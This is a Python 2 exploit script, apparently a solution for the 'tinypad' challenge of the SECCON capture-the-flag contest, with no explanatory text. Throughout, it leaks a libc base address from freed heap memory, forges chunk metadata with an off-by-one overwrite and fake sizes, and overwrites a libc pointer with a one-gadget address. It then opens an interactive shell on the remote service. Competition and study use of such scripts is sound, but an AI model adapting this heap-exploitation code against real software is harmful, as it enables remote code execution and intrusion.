#!/usr/bin/env python

import socket
import struct
from telnetlib import *


pack = lambda x : struct.pack( "<L", x )
unpack = lambda x : struct.unpack( "<L", x )[0]

pack64 = lambda x : struct.pack( "<Q", x )
unpack64 = lambda x : struct.unpack( "<Q", x )[0]


HOST = '127.0.0.1'
HOST = 'tinypad.pwn.seccon.jp'

PORT = 57463

def recvuntil(t):
 data = ''
 while not data.endswith(t):
  tmp = s.recv(1)
  if not tmp: break
  data += tmp
 return data

s = socket.create_connection((HOST, PORT))

def add(data, size):
	s.send('A\n')

	recvuntil('>>>')

	s.send(str(size) + '\n')

	recvuntil('>>>')

	s.send(data)

	recvuntil('>>>')

def delete(idx):
	s.send('D\n')
	recvuntil('>>>')

	s.send(str(idx) + '\n')
	recvuntil('>>>')

print recvuntil('>>>')

add('a' * 160 + '\n', 160)
add('a' *160+ '\n', 200)
add('a' *160+ '\n', 200)

s.send('D\n')
print recvuntil('>>>')

s.send('2\n')
recvuntil(': 2')
recvuntil(': ')
libc = recvuntil('\n')[:-1]
libc = libc + '\x00' * (8 - len(libc))

libc_base = unpack64(libc) - 0x00000000003BE7B8

print 'libcbase: %x' % libc_base

recvuntil('>>>')

delete(3)
delete(1)

add('1' * 0xf8 + '\n', 0xf8)
add('2' *0x40+ '\n', 0x60)
add('3' * 0x10 + pack64(0x21) * 4 + '\n', 0x40)
add('4' *0x40+ '\n', 0x40)

s.send('E\n')
print recvuntil('>>>')

s.send('1\n')
print recvuntil('>>>')

s.send('k'*0xf8 + '\xa1' + '\n')
print recvuntil('>>>')

s.send('Y\n')
print recvuntil('>>>')

s.send('E\n')
print recvuntil('>>>')

s.send('1\n')
print recvuntil('>>>')

s.send('k'*0xe0 + pack64(0x0) + pack64(0x51) + pack64(0x0) + '\n')
print recvuntil('>>>')

s.send('Y\n')
print recvuntil('>>>')

delete(2)
delete(3)

add('5' *0x68 + pack64(0x50) + pack64(0x602120) + '\n', 0x80)

delete(2)

add('aaaa' + '\n', 0x40)

oneshot = 0x46428

libc_tls_get_addr = 0x3be038

# to overwrite address
add('7' * 0x18+ pack64(libc_base+libc_tls_get_addr) + 'aaaa' +'\n', 0x40) 

raw_input()
s.send('E\n')
print recvuntil('>>>')

s.send('1\n')
recvuntil(': ')
print recvuntil('\n').encode('hex')

print recvuntil('>>>')

#overwrite
s.send(pack64(libc_base+oneshot) + '\n')
print recvuntil('>>>')

s.send('Y\n')
print recvuntil('>>>')



t = Telnet()
t.sock = s
t.interact()